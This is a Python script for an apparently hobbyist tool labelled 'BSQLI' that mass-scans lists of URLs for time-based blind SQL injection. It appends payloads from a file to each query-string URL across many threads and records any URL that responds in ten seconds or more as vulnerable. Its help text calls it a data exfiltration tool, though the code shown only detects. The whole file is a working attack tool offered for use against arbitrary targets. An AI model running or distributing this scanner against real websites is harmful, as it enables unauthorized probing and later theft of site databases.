import signal
import sys
import requests
import argparse
import colorama
import os
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote
from bs4 import BeautifulSoup
from pystyle import Center, Colors, Colorate, System, Write

colorama.init(autoreset=True)

logo = """
__________  _________________  .____    .___
\______   \/   _____/\_____  \ |    |   |   |
 |    |  _/\_____  \  /  / \  \|    |   |   |
 |    |   \/        \/   \_/.  \    |___|   |
 |______  /_______  /\_____\ \_/_______ \___|
        \/        \/        \__>       \/    
                
                    By KonaN<3
"""

print(Colorate.Diagonal(Colors.purple_to_red, logo))

class Logging:
    @classmethod
    def log(cls, msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    @classmethod
    def error(cls, msg):
        cls.log(Colorate.Diagonal(Colors.red_to_yellow, msg))

    @classmethod
    def info(cls, msg):
        cls.log(Colorate.Diagonal(Colors.blue_to_cyan, msg))

    @classmethod
    def success(cls, msg):
        cls.log(Colorate.Diagonal(Colors.green_to_cyan, msg))

def signal_handler(sig, frame):
    Logging.error("[x] Stopping...")
    output.close()
    quit()

def exploit(url, payload):
    try:
        link = f"{url}{payload}"
        response = requests.get(link, timeout=20, verify=not args.no_ssl_verify)
        response_time = round(response.elapsed.total_seconds(), 2)

        if response.status_code != 404 and response_time >= 10:
            Logging.success(f"[ ✓ ] Found!: {link} | Time: {response_time}")
            output.write(f"{link}\n")
        elif not args.hide_fail:
            Logging.error(f"[ X ] Not Vulnerable: {link} | Time: {response_time}")
    except requests.RequestException:
        pass

def url_has_query(url):
    parsed_url = urlparse(url)
    return bool(parsed_url.query) and any(param.split('=')[0] for param in parsed_url.query.split('&'))

def main():
    parser = argparse.ArgumentParser(description='Proof of Concept Blind SQL LIKE CLAUSE Data Exfiltration Tool')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help="Target URL")
    group.add_argument('-l', '--file', help="URLs file")
    parser.add_argument('-p', '--payloads', required=True, help="Payloads file")
    parser.add_argument('-t', '--threads', type=int, default=1, help="Number of threads")
    parser.add_argument('-o', '--output', default='output.txt', help="Output file for results")
    parser.add_argument('-hf', '--hide-fail', '--hide-fails', default=False, action='store_true', help="Hide failed attempts")
    parser.add_argument('-s', '--no-ssl-verify', default=False, action='store_true', help="Disable SSL verification")

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    global output, args
    args = parser.parse_args()
    urls = open(args.file, 'r').read().splitlines() if args.file else [args.url] if args.url else []
    Logging.info(f"[!] Found a total of {len(urls)} URLs")

    payloads = open(args.payloads, 'r').read().splitlines()
    output = open(args.output, 'w')

    if args.no_ssl_verify:
        requests.packages.urllib3.disable_warnings()

    tasks = [(url, payload.rstrip()) for url in urls if url_has_query(url) or (Logging.error(f"[x] skipping {url} due to no query") if not args.hide_fail else False) for payload in payloads]

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(exploit, task[0], task[1]) for task in tasks]

        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    output.close()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()
